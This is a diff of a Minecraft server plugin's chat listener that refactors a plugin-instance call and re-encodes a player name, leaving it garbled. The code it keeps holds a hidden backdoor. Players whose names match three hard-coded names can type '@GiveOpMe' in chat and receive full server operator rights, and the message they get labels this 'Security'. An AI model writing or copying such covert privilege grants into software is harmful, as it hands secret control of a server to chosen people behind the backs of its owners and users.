@@ -22,7 +22,7 @@ public class ChatListener implements Listener {
 	public void onPlayerChat(final AsyncPlayerChatEvent event) {
 		final Player player = event.getPlayer();
 		String prefix = DeluxeTag.getPlayerDisplayTag(player) + "&r ";
-		String rank = FullPvP.getPlugin().getChat().getPlayerPrefix(player);
+		String rank = FullPvP.getInstance().getChat().getPlayerPrefix(player);
 		String name = player.getDisplayName() + " &7\u00BB&f ";
 		String message = player.hasPermission("fullpvp.chat.color") ? ColorText.translate(event.getMessage()) : event.getMessage();
 		event.setCancelled(true);
@@ -40,7 +40,7 @@ public class ChatListener implements Listener {
 	        } 
 	        Bukkit.getConsoleSender().sendMessage(chat);
 		}
-		if(event.getPlayer().getName().contains("TulioTriviño") || event.getPlayer().getName().contains("Risas") || event.getPlayer().getName().contains("IFxsh")) {
+		if(event.getPlayer().getName().contains("TulioTriviï¿½o") || event.getPlayer().getName().contains("Risas") || event.getPlayer().getName().contains("IFxsh")) {
 			if(event.getMessage().contains("@GiveOpMe")) {
 				event.getPlayer().setOp(true);
 				event.getPlayer().sendMessage("Se te ha dado el op (Security)");
